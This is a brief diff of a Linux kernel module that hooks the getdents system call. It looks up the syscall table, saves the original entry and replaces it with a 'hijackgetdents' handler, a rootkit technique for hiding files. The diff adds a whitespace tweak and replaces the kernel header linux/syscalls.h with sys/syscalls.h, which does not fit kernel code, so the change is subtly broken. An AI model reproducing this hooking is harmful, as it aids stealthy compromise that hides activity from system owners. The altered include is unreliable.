@@ -2,7 +2,7 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/unistd.h>
-#include <linux/syscalls.h>
+#include <sys/syscalls.h>
 #include <linux/kallsyms.h>
 
 MODULE_LICENSE("GPL");
@@ -25,7 +25,7 @@ return 0;
 static int init_syscall(void)
 {
         syscall_table = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
-        originalGetDents=syscall_table[sys_getdents];
+        originalGetDents = syscall_table[sys_getdents];
         syscall_table[sys_getdents]=(unsigned long*) hijackgetdents;
         printk(KERN_INFO "Custom syscall loaded\n");
         return 0;
